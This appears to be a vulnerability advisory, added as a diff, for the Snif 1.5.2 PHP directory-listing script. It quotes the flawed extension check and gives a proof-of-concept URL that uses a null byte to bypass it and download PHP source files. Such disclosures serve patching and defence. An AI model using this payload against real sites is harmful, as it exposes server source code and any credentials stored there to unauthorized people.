@@ -1,0 +1,62 @@
+--------------------------------------------
+-: Snif - "Any Filetype" Download Exploit :-
+--------------------------------------------
+
+Script   : Snif - (Simple And Nice Index File) 
+Version  : 1.5.2 (possibly lower versions too)
+Found By : Aodrulez.
+Email    : f3arm3d3ar[at]gmail.com
+
+Vulnerability:
+--------------
+
+Some Default Settings are:
+
+$hiddenFilesWildcards = Array("*.php", "*~");
+$allowPHPDownloads = false;
+
+The first option will prevent any php file 
+from being listed in the directory listing.
+Second one will prevent download of files 
+with ".php" extension.
+
+Even with these options set,we can still
+download php files....due to the following
+vulnerable code:-
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+if ($_GET["download"]!="") {
+	
+ $download = stripslashes($_GET["download"]);
+ $filename = safeDirectory($path.rawurldecode($download));
+ if (
+	!file_exists($filename)
+	OR fileIsHidden($filename)
+	OR (substr(strtolower($filename), -4)==".php" AND !$allowPHPDownloads)) {
+		
+		
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+The last line in the above code checks the
+file's extension to make sure its not a php
+file.This line of code is Vulnerable though
+
+Exploit:
+--------
+
+Lets say the script is located here:
+http://www.a.com/snif.php
+
+The following url will bypass all restrictions
+and let you download a php file :-
+
+http://www.a.com/snif.php?download=snif.php%00
+
+
+Greetz Fly Out To
+-----------------
+
+Amforked() 	         : My Mentor.
+The Blue Genius      : My Boss.
+www.orchidseven.com
+www.isac.org.in
